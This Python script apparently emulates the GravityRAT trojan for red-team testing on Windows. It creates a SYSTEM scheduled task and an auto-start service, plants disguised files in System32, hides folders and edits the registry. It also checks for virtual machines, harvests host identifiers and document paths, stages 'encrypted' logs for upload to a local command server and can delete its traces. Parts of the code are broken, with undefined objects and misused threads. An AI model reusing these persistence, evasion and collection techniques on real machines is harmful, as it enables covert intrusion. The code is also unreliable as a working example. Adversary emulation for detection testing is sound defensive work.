# Gravity Rat Red team automation simulation
# Modules used:
# 1 - File_Search - No changes
# 2 - File_Creation_Module - No changes
# 3 - Hidden_Folder - No changes
# 4 - schtask_escalation - No changes
# 5 - Class_C_Scan_Module - No changes
# 6 - http

# Tasks completed:
# 1 - Creates files and folders
# 2 - Creates service
# 3 - Creates a new process
# 4 - Creates a new local http server
# 5 - Creates a encryptor and encrypts all commands output


# Manually Created:
# 1 - Add/Delete Registry key/value - 10 minutes
# 2 - Execute WMI BIOS commands - 1 hour
# 3 - Create new mutex - 10 minutes
# 4 - Create new queue and threads - 1 hour
# 5 - Encryption with base64 + salt - 5 minutes
# 6 - Create new threads - 30 minutes

# Total Time - 30 h


import base64
import multiprocessing
import os
import platform
import shutil
import subprocess
import sys
import time
import uuid
from threading import Lock
from threading import Thread

import common
# ==========Registry imports========
from _winreg import *


class Action_Que:
    '''
    This class is use to create a new queue that will be used to hold all the action's the malware should
    preform after the CNC sent them.
    '''

    def __init__(self):
        common.log("Starting new queue for saving cnc orders")
        self.que = []
        self.quesize = len(self.que)

    def enqueue(self, action):
        self.que.append(action)
        self.quesize += 1

    def dequeue(self):
        self.quesize -= 1
        return self.que.pop(0)

    def peek(self):
        print
        self.que[0]

    def isempty(self):
        if self.quesize == 0:
            return True
        else:
            return False


def Thread1Action(queue):
    '''
    This thread will check every 10 seconds if the queue is empty.
    If not it will pop out the action to take and preform it, will go back to sleep for 5 seconds,
    so on until the que is empty
    :param queue: The action queue
    :return:
    '''
    common.log("Starting new thread -> Checking action queue every 10 seconds")
    while queue.isempty() == False:
        if queue.isempty():
            time.sleep(10)

        else:
            action = queue.dequeue()

            if action == 1:
                try:
                    common.log("Argument 1 is passed. Starting Taskkill to the gravity process...")
                    time.sleep(2)
                    main_file_procid = a.GetCurrentProcID()
                    os.system("taskkill /pid %s" % str(main_file_procid))
                    common.logcsv([common.HOSTNAME, common.gettime(), 'Process', 'taskkill', 'Created', 'Completed'])
                except:
                    common.logcsv([common.HOSTNAME, common.gettime(), 'Process', 'taskkill', 'Created', 'Failed'])

            elif action == 12:
                common.log("Argument 1 is passed. Starting self destroy...")
                try:
                    common.log("Deleting services...")
                    time.sleep(1)
                    os.system("sc delete LSAS")

                    common.log("Deleting schedule tasks...")
                    time.sleep(1)
                    schtasks('/delete', '/tn', "GRAT", '/f')
                except:
                    common.logcsv([common.HOSTNAME, common.gettime(), 'Task', 'LSASS', 'Deleted', 'Completed'])

                files_to_delete = []
                common.log("Argument 12 is passed. Starting self destroy action...")
                time.sleep(1)
                common.log("Deleting all files...")
                time.sleep(1)
                files_to_delete.append(a.find("zipquery.dll", "C:\\windows\\system32"))
                files_to_delete.append(a.find("LSASS.exe", "C:\\Users\\lsas"))
                files_to_delete.append(a.find(sys.argv[0], "C:\\Users"))  # delete the current GravityRat.py
                dat_files = ["Cmd.dat", "P.dat", "PM.dat", "SM.dat"]
                for file in dat_files:
                    try:
                        files_to_delete.append(scratch.find(file, "C:\\Users\\storage"))
                        common.logcsv([common.HOSTNAME, common.gettime(), 'File', "%s" % file, 'Deleted', 'Completed'])
                    except:
                        common.logcsv([common.HOSTNAME, common.gettime(), 'File', "%s" % file, 'Deleted', 'Failed'])
                    time.sleep(2)

                # Delete all malware's created files
                for file in files_to_delete:
                    try:
                        common.remove_file(file)
                        common.logcsv([common.HOSTNAME, common.gettime(), 'File', "%s" % file, 'Deleted', 'Completed'])
                    except:
                        common.logcsv([common.HOSTNAME, common.gettime(), 'File', "%s" % file, 'Deleted', 'Failed'])

            elif action == 3:
                try:
                    common.log("Argmunet 3 is passed. Starting process scan using tasklist...")
                    time.sleep(2)
                    os.system("start tasklist")
                    if queue.isempty():
                        common.log("Que is now empty")
                    common.logcsv([common.HOSTNAME, common.gettime(), 'Process', "tasklist", 'Created', 'Completed'])

                except:
                    common.logcsv([common.HOSTNAME, common.gettime(), 'Process', "tasklist", 'Created', 'Failed'])


            elif action == 13:  # Test action
                common.log("Argument 13 is passed")
                if queue.isempty():
                    common.log("Que is now empty")
                os.system("start calc.exe")

            elif action == 2:
                try:
                    common.log("Argmunet 2 is passed. Starting portscan using netstat...")
                    time.sleep(2)
                    os.system("start netstat -a")
                    if queue.isempty():
                        common.log("Que is now empty")
                    common.logcsv([common.HOSTNAME, common.gettime(), 'Process', "netstat", 'Created', 'Completed'])

                except:
                    common.logcsv([common.HOSTNAME, common.gettime(), 'Process', "netstat", 'Created', 'Failed'])

            elif action == 4:
                common.log("Argmunet 4 is passed. Starting service scan using sc queryex...")
                time.sleep(2)
                os.system("start sc queryex type= service state= all")
                if queue.isempty():
                    common.log("Que is now empty")


            elif action == 5:
                common.log("Argmunet 5 is passed. Starting drives scan...")
                time.sleep(2)
                os.system("start wmic logicaldisk get caption")
                if queue.isempty():
                    common.log("Que is now empty")

            elif action == 7:
                common.log("Argmunet 7 is passed. Starting the cmd...")
                time.sleep(2)
                os.system("start cmd.exe")
                if queue.isempty():
                    common.log("Que is now empty")

            elif action == 10:
                common.log("Argmunet 10 is passed. Starting broadcast...")
                time.sleep(2)
                process = subprocess.Popen("start python Class_C_Scan_Module.py")
                if queue.isempty():
                    common.log("Que is now empty")

            elif action == 11:
                common.log("Argmunet 11 is passed. Stopping broadcast...")
                time.sleep(2)
                os.system("taskkill /pid %s" % str(process.pid))
                if queue.isempty():
                    common.log("Que is now empty")


def Thread2Action(queue, action):
    '''
    This thread add new actions given by the CNC to the action queue.
    :param queue: The action queue
    :return:
    '''
    common.log("Starting new thread -> enqueueing new action to action queue")
    queue.enqueue(action)


def ExecuteAndWriteToCsv(f):
    '''
    This is a decorator function meant to log the function result and update the csv file.
    :param f: function object
    :return: the f function return statement or the error is raised
    '''

    def wrapper(*args, **kwargs):

        result = 0

        try:
            if args[0] == "NOCSV":
                IOCArgs = [args[0]]
                args = GetFunctionArgs(args, IOCArgs)
                result = f(*args, **kwargs)

            elif len(args) > 1:
                IOCArgs = [args[0], args[1], args[2]]
                args = args[3:]
                result = f(*args, **kwargs)
                row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Completed"]
                common.logcsv(row)

        except Exception as err:
            if args[0] == "NOCSV":
                common.log("Error in %s --> Error code is %s" % (GetFunctionName(f), str(err)))
                return result
            else:
                common.log("Error in %s --> Error code is %s" % (GetFunctionName(f), str(err)))
                row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Failed"]
                result = str(err)
                common.logcsv(row)
                return result

        return result

    return wrapper


def OSCommand(*args):
    result = 0
    IOCArgs = [args[0], args[1], args[2]]
    Command = args[3]
    try:
        result = os.system(Command)
        row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Completed"]
        common.log("The command -" + Command + "- was successfully run")
    except Exception as err:
        row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Failed"]
        common.log("The command -" + Command + "- failed: " + str(err))
    common.logcsv(row)


def GetFunctionArgs(FunctionArgs, IOCArgs):
    FunctionArgs = [elem for elem in FunctionArgs if elem not in IOCArgs]
    return FunctionArgs


def GetFunctionName(f):
    '''
    :param f: Function type
    :return: String rep of the function name
    '''

    return f.__name__


def EncryptAndLogData(data, file):
    key = "lolomycin2017"
    encrypted_data = base64.urlsafe_b64encode(key + str(data))
    with open(file, 'a+') as file:
        file.write(encrypted_data + " \n")


def install(package):
    '''
    Open a new process and try to install the new lib -> pip install 'package'
    :param package: External lib to install | String
    '''
    subprocess.call([sys.executable, "-m", "pip", "install", package])


@ExecuteAndWriteToCsv
def find(name, path, EndWith=False):
    '''
    Find a file in the system path
    :param name: String -> File name
    :param path: system path, Example -> C:\
    :param EndWith: A flag indicating the user wants to look for all files with specific endings, i.e. .txt / .exe ...
    :return: String -> The path to the file (e.g C:\path\file)
    '''

    if EndWith == False:
        common.log("Trying to search for %s..." % name)
        time.sleep(2)
        for root, dirs, files in os.walk(path):
            if name in files and "Recycle" not in root:
                return os.path.join(root, name)
    else:
        files_found = []
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(name):
                    common.log(os.path.join(root, file))
                    files_found.append(path + file)
        return files_found


@ExecuteAndWriteToCsv
def file_creation(TARGET_APP_NAME=None, TARGET_LOCATION=None):
    '''
    This function will create a new file in the Target path
    :param TARGET_APP_NAME: The name of the new file | String rep
    :param TARGET_LOCATION: The path to the new file | String rep
    '''
    common.log("Creating %s" % TARGET_APP_NAME)
    time.sleep(2)
    filename = TARGET_LOCATION + "\\" + TARGET_APP_NAME
    os.system('echo "This file was create by GravityRat" > ' + filename)

    return filename


@ExecuteAndWriteToCsv
def schtasks(*args, **kwargs):
    return common.execute(['schtasks.exe'] + list(args), **kwargs)


@ExecuteAndWriteToCsv
def http_from_process(name, ip, port):
    path = os.path.join(common.BASE_DIR, name)
    common.log("Making HTTP GET from %s" % path)
    shutil.copy(sys.executable, path)
    common.execute([path, "-c", "import urllib; urllib.urlopen('http://%s:%d')" % (ip, port)])
    common.remove_file(path)


@ExecuteAndWriteToCsv
def HideFolder(TARGET_LOCATION=None):
    subprocess.call(["attrib", "+H", TARGET_LOCATION])


@ExecuteAndWriteToCsv
def CreateMutex():
    mutex = Lock()
    mutex.acquire()
    return mutex


@ExecuteAndWriteToCsv
def ReleaseMutex(mutex):
    mutex.release()


@ExecuteAndWriteToCsv
def DeleteRegValueOrKey(Key, value=None):
    common.log("Try to delete the values of %s..." % Key)
    time.sleep(2)
    if value is not None:
        return os.system("reg delete %s /v %s /f" % (Key, value))  # return 0 if successful

    else:
        return os.system("reg delete %s /f" % Key)  # return 0 if successful


@ExecuteAndWriteToCsv
def AddRegValueOrKey(Key, value=None):
    common.log("Trying to add new value to %s" % Key)
    time.sleep(2)
    if value is not None:
        return os.system("reg add %s /v %s /t REG_SZ /d calc.exe" % (Key, value))  # return 0 if successful

    else:
        return os.system("reg add %s " % Key)  # return 0 if successful


@ExecuteAndWriteToCsv
def HKLMGetRegistryKeyNumberOfValues(key):
    common.log("Getting the numbert of value of registry key -%s-..." % key)
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ)
    NumberOfValues = QueryInfoKey(KeyHandle)[1]
    CloseKey(KeyHandle)

    return NumberOfValues


@ExecuteAndWriteToCsv
def HKLMGetRegistryKeyValues(key):
    common.log("Searching for the registry key %s values..." % key)
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ)
    Data = []
    NumberOfValues = HKLMGetRegistryKeyNumberOfValues("NOCSV", key)
    for i in range(NumberOfValues):
        Data.append(EnumValue(KeyHandle, i)[1])
    return Data  # Return a list containg all the data of the key values


@ExecuteAndWriteToCsv
def CheckRunningEnvironment(wmi_result, wmi_type):
    if wmi_type == "Manufacturer":
        common.log("Check to see if the vendor found -%s- is a hint for virtual machine run" % wmi_result)
        time.sleep(2)
        bad_manufacturers = ["VIRTUAL", "cnware", "VirtualBox"]
        for bad_vendor in bad_manufacturers:
            if bad_vendor == wmi_result:
                common.log("The program is running in virtual machine! Terminating the program")
                time.sleep(2)
                sys.exit(1)
        common.log("The script is not running in a virtual envirmonet!")
    elif wmi_type == "Processor":
        common.log("Check to see if processor_id exist. It is a hint for virtual machine run")
        time.sleep(2)
        if wmi_result is None:
            common.log("The program is running in virtual machine! Terminating the program")
            time.sleep(2)
            sys.exit(1)


####Install new libs#####
install("pywin32")
import win32com.client
from win32event import CreateMutex

install("wmi")
import wmi

install("requests")
import requests


#########################


def main():
    # ******************* Set paths *******************
    user_path = "C:\\Users"
    storage_path = user_path + "\\storage"
    root_path = user_path + "\\lsass"
    system32_path = "C:\\Windows\\System32"

    # ******************* Initialize new queue *******************
    common.log("#################################################")
    common.log("Creating new CNC action queue...")
    time.sleep(2)
    action_queue = Action_Que()

    # ******************* Initialize enqueue dequeue threads *******************
    common.log("#################################################")
    common.log("Creating new thread to enqueue actions")
    thread2 = Thread(target=Thread2Action(action_queue, [2, 3]))
    thread2.start()
    common.log("Creating new thread to dequeue actions and preform them")
    thread1 = Thread(target=Thread2Action(action_queue, [2, 3]))
    thread1.start()

    # ******************* Post HTTP request on port 46769 *******************
    common.log("#################################################")
    common.log("Sending http post request...")
    file_creation("NOCSV", "bginfo.exe", "C:\\Users")
    server, ip, port = common.serve_web(46769)
    http_from_process("Port", 46769, "Created", "C:\\Users\\bginfo.exe", ip, port)

    # ******************* Create LSAS Mutex *******************
    common.log("#################################################")
    common.log("Creating new mutex - LSAS")
    time.sleep(2)
    try:
        mutex = CreateMutex()
        row = [common.HOSTNAME, common.gettime(), "Mutex", "LSAS", "Created", "Completed"]
    except:
        row = [common.HOSTNAME, common.gettime(), "Mutex", "LSAS", "Created", "Failed"]
    common.logcsv(row)

    # ******************* Create storage dir in C:\Users *******************
    common.log("#################################################")
    common.log("Creating new files and folders...")
    time.sleep(2)
    common.log("Creating %s..." % storage_path)
    time.sleep(2)
    try:
        os.makedirs(storage_path)
        row = [common.HOSTNAME, common.gettime(), 'Folder', storage_path, 'Created', 'Completed']
    except:
        row = [common.HOSTNAME, common.gettime(), 'Folder', storage_path, 'Created', 'Failed']
    common.logcsv(row)

    # ******************* Create P.dat file in storage dir *******************
    # Creating P.dat that will store all the encypypted data
    encrypt_log_file = storage_path + "\\P.dat"
    file_creation("File", encrypt_log_file, "Created", "P.dat", storage_path)
    time.sleep(2)

    # ******************* Create dirs under C:\Users *******************
    folder_to_create = ["lsass", "information", "storage"]
    for folder in folder_to_create:
        path_to_folder = user_path + "\\" + folder
        OSCommand("Folder", path_to_folder, "Created", 'mkdir "' + path_to_folder + '"')  # Root directory
        EncryptAndLogData("Creating " + path_to_folder, encrypt_log_file)
        time.sleep(2)

    # ******************* Create LSASS.exe under C:\Users\lsass *******************
    lsass_path = root_path + "\\" + "LSASS.exe"
    file_creation("File", lsass_path, "Created", "LSASS.exe", root_path)
    EncryptAndLogData("Creating " + lsass_path, encrypt_log_file)
    time.sleep(2)

    # ******************* Create zipquery.dll under C:\Windows\System32 *******************
    zipquery_path = system32_path + "\\" + "zipquery.dll"
    file_creation("File", zipquery_path, "Created", "zipquery.dll", system32_path)
    EncryptAndLogData("Creating " + zipquery_path, encrypt_log_file)
    time.sleep(2)

    # ******************* Hide created dirs under C:\Users *******************
    for folder in folder_to_create:
        path_to_folder = user_path + "\\" + folder
        common.log("Hidding folder " + path_to_folder)
        HideFolder("File", path_to_folder, "Updated", path_to_folder)
        EncryptAndLogData("Hiding " + path_to_folder, encrypt_log_file)
        time.sleep(2)

    # ******************* Create new dat files in C:\Users\storage *******************
    dat_files = ["Cmd.dat", "PM.dat", "SM.dat"]
    for file in dat_files:
        dat_file_path = storage_path + "\\" + file
        file_creation("File", dat_file_path, "Created", file, storage_path)
        EncryptAndLogData("Creating " + dat_file_path, encrypt_log_file)

    # ******************* Search files with specific extension *******************
    common.log("#################################################")
    common.log("Searching for files...")
    end_of_files = [".ppt", ".pptx", ".doc", ".docx", ".xlx", ".xlxs", ".xlsx", ".pdf"]
    for end in end_of_files:
        result = find("NOCSV", end, "C:\\", True)
        if result is not None:
            for path in result:
                common.log("found %s file -> %s" % (end, path))

    # ******************* Create LSAS service *******************
    common.log("#################################################")
    common.log("Creating new windows service - LSAS")
    time.sleep(2)
    OSCommand("Service", "LSAS", "Created", "sc create LSAS start= auto  displayname= LSAS binpath= " + lsass_path)

    # ******************* Create and run GRAT task  *******************
    common.log("#################################################")
    common.log("Scheduled Task Privilege Escalation")
    time.sleep(2)
    task_name = 'GRAT'
    file_path = os.path.abspath('task.log')
    command = "cmd.exe /c whoami.exe > " + file_path
    code = schtasks("NOCSV", '/query', '/tn', task_name)
    if code == 0:
        schtasks('/delete', '/tn', task_name, '/f')  # Delete the task if it exists
    code = schtasks("Task", "GRAT", "Created", '/create', '/tn', task_name, '/ru', 'system', '/tr', command, '/sc',
                    'onlogon')
    if code != 0:
        common.log("Error creating task", log_type="!")
    code = schtasks("Task", "GRAT", "Updated", '/run', '/tn', task_name)  # Run the task and grab the file

    # ******************* Get data of specific reg-key and write to P.dat *******************
    common.log("#################################################")
    common.log("Checking registries...")
    time.sleep(2)
    key = "Software\\Microsoft\\Virtual Machine\\Guest\\Parameters"
    VMRegKey = HKLMGetRegistryKeyValues("Registry", "HKEY_LOCAL_MACHINE\\" + key, "Updated", key)
    EncryptAndLogData(VMRegKey, encrypt_log_file)
    time.sleep(2)

    # ******************* Check if the local machine is a Virtual-Machine *******************
    common.log("#################################################")
    common.log("Starting to check anti vm using wmi")

    # ------- Step 1: Get machine's serial number -------
    common.log("[1] Trying to fetch the local machine serial number...")
    time.sleep(2)
    strComputer = "."
    objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    objSWbemServices = objWMIService.ConnectServer(strComputer, "root\cimv2")
    colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_BIOS")
    for objItem in colItems:
        if objItem.SerialNumber != None:  # TODO: Check with  sundy the serial numbers of vmware/virtualbox/XEN
            wmi_result = ` objItem.SerialNumber`
            common.log("SerialNumber:" + wmi_result)
            EncryptAndLogData(wmi_result, encrypt_log_file)

            # ------- Step 2: Get machine's manufacturer -------
    common.log("[2] Trying to fetch the local machine manufacturer...")
    time.sleep(2)
    for objItem in colItems:
        wmi_result = ` objItem.Manufacturer`
        CheckRunningEnvironment("NOCSV", wmi_result, "Manufacturer")
        EncryptAndLogData(wmi_result, encrypt_log_file)

        # ------- Step 3: Get machine's processorID -------
    common.log("[3] Trying to fetch the local machine processorID...")
    time.sleep(2)
    colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_Processor")
    for objItem in colItems:
        wmi_result = ` objItem.ProcessorId`
        CheckRunningEnvironment("NOCSV", wmi_result, "Processor")
        EncryptAndLogData(wmi_result, encrypt_log_file)

        # ------- Step 4: Get machine's core number -------
    common.log("[4] Trying to fetch the local machine core number...")
    time.sleep(2)
    if multiprocessing.cpu_count() == 1:
        common.log("Local Machine has 1 core - The program is running in virtual machine! Terminating the program")
        EncryptAndLogData(str(multiprocessing.cpu_count()), encrypt_log_file)
        time.sleep(2)
        # sys.exit(1) # TODO - Remove comment?
    else:
        common.log("The local system is not running on a VM")

        # ------- Step 5: Get machine's cpu-temperature -------
    common.log("[5] Trying to fetch the local machine cpu's temperature")
    try:
        time.sleep(2)
        w = wmi.WMI()
        wmi_result = w.Win32_TemperatureProbe()[0].CurrentReading
        common.log(wmi_result)
        EncryptAndLogData(wmi_result, encrypt_log_file)
    except:
        time.sleep(2)
        common.log("The local cpu does not provide the cpu temperature information")
        EncryptAndLogData("The local cpu does not provide the cpu temperature information", encrypt_log_file)

        # ------- Step 6: Get machine's mac-address -------
    common.log("#################################################")
    common.log("[6] Trying to fetch the local machine mac-address")
    time.sleep(2)
    common.log("The machine mac-address is: %s" % hex(uuid.getnode()))
    EncryptAndLogData(hex(uuid.getnode()), encrypt_log_file)

    # ******************* Firewall check in registry and write to P.dat *******************
    common.log("#################################################")
    common.log("Checking if firewall is enabled in the registry")
    time.sleep(2)
    key = "System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile"
    VMRegKey = HKLMGetRegistryKeyValues("Registry", "HKEY_LOCAL_MACHINE\\" + key, "Updated", key)
    EncryptAndLogData("EnableFirwall" + str(VMRegKey[0]), encrypt_log_file)

    # ******************* Check current-account's permissions *******************
    common.log("#################################################")
    common.log("Checking if current logged user is Guest/Administrator/User...")
    time.sleep(2)
    if common.HOSTNAME == "Guest" or common.HOSTNAME == "guest":
        common.log("The current user is a guest type user")
        EncryptAndLogData("Guest", encrypt_log_file)
    elif common.HOSTNAME == "Administrator" or common.HOSTNAME == "administrator":
        common.log("The current user is an admin type user")
        EncryptAndLogData("Administrator", encrypt_log_file)
    else:
        common.log("The current user is a regular user")
        EncryptAndLogData("%s" % common.HOSTNAME, encrypt_log_file)

    # ******************* Get session info *******************
    common.log("#################################################")
    common.log("Trying to get username, PC name, process ID, EthernetID, User Code, User domain, OS version...")
    time.sleep(2)

    # ------- Username -------
    common.log("Getting the username")
    common.log(common.HOSTNAME)
    EncryptAndLogData(common.HOSTNAME, encrypt_log_file)
    time.sleep(2)

    # ------- PC-Name -------
    common.log("Getting the PC name")
    common.log(os.environ['COMPUTERNAME'])
    EncryptAndLogData(os.environ['COMPUTERNAME'], encrypt_log_file)
    time.sleep(2)

    # ------- This PID -------
    common.log("Getting the process id of the script")
    common.log(str(os.getpid()))
    EncryptAndLogData((str(os.getpid())), encrypt_log_file)
    time.sleep(2)

    # ------- MAC-Address -------
    common.log("Getting the EthernetID - Mac-address")
    mac_address = (
        ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1]))
    common.log(mac_address)
    EncryptAndLogData(mac_address, encrypt_log_file)
    time.sleep(2)

    # ------- User-Code -------
    common.log("Getting the user code")
    a_path = "C:\\a.txt"
    OSCommand("File", a_path, "Created", "wmic useraccount where name='%username%' get sid > " + a_path)
    with open(a_path, 'r') as f:
        text = f.readlines()
        sid = text[1]
    common.remove_file(a_path)
    common.logcsv([common.HOSTNAME, common.gettime(), 'File', a_path, 'Deleted', 'Completed'])
    common.log(sid)
    EncryptAndLogData(sid, encrypt_log_file)
    time.sleep(2)

    # ------- User-Domain -------
    common.log("Getting the user's domain name")
    domain = os.environ['userdomain']
    common.log(domain)
    EncryptAndLogData(domain, encrypt_log_file)
    time.sleep(2)

    # ------- OS-Version -------
    common.log("Getting the OS version")
    os_details = platform.platform()
    common.log(os_details)
    EncryptAndLogData(os_details, encrypt_log_file)
    time.sleep(2)

    # ------- System-Info -------
    common.log("Getting the system information and sending them to CNC")
    systeminfo_path = storage_path + "\\systeminfo.txt"
    OSCommand("File", systeminfo_path, "Created", " systeminfo > " + systeminfo_path)

    # ******************* Create calc.exe process *******************
    common.log("#################################################")
    common.log("Create a hidden process -> cmc /c $command")
    time.sleep(2)
    OSCommand("Process", "cmd.exe", "Created", "start cmd.exe /c calc.exe")

    # ******************* Send .dat files to CNC *******************
    common.log("#################################################")
    common.log("Sending all the .dat files to the CNC (localhost)")
    time.sleep(2)
    common.log("Starting local web server...")
    time.sleep(2)
    server, ip, port = common.serve_web(80)
    url = "http://" + str(ip) + ":" + str(port)
    try:
        for file in dat_files:
            dat_file_path = storage_path + "\\" + file
            files = {'upload_file': open(dat_file_path, 'rb')}
            requests.Request('POST', url, files=files).prepare().body.decode('ascii')
        files = {'upload_file': open(storage_path + "\\systeminfo.txt", 'rb')}
        requests.Request('POST', url, files=files).prepare().body.decode('ascii')
        row = [common.HOSTNAME, common.gettime(), 'Port', '80', 'Created', 'Completed']
    except Exception as e:
        row = [common.HOSTNAME, common.gettime(), 'Port', '80', 'Created', 'Failed']
    common.logcsv(row)

    # ******************* Delete .dat files *******************
    common.log("#################################################")
    common.log("Deleting all files...")
    time.sleep(2)
    dat_files = [storage_path + "\\systeminfo.txt",
                 storage_path + "\\Cmd.dat",
                 storage_path + "\\P.dat",
                 storage_path + "\\PM.dat",
                 storage_path + "\\SM.dat"]
    for file in dat_files:
        try:
            common.remove_file(file)
            row = [common.HOSTNAME, common.gettime(), 'File', file, 'Deleted', 'Completed']
        except Exception as err:
            row = [common.HOSTNAME, common.gettime(), 'File', file, 'Deleted', 'Failed']
        finally:
            common.logcsv(row)

    # ******************* Start threads *******************
    action_queue = Action_Que()
    thread1 = Thread(target=Thread1Action, args=[action_queue])
    thread2 = Thread(target=Thread2Action, args=[action_queue, 13])
    thread2.start()
    thread2.join()
    thread1.start()
    thread1.join()


if __name__ == "__main__":
    if not os.path.exists(common.LOG_DIR):
        try:
            os.makedirs(common.LOG_DIR)  # Create C:\csvlog LOG_DIR
            row = [common.HOSTNAME, common.gettime(), 'Folder', 'C:\csvlog', 'Created', 'Completed']
        except ImportError:
            row = [common.HOSTNAME, common.gettime(), 'Folder', 'C:\csvlog', 'Created', 'Failed']
        common.logcsv(row)

    if not os.path.exists(common.BASE_DIR):
        try:
            os.makedirs(common.BASE_DIR)  # Create C:\GravityRat BASE_DIR
            row = [common.HOSTNAME, common.gettime(), 'Folder', common.BASE_DIR, 'Created', 'Completed']
        except ImportError:
            row = [common.HOSTNAME, common.gettime(), 'Folder', common.BASE_DIR, 'Created', 'Failed']
        common.logcsv(row)
    exit(main())
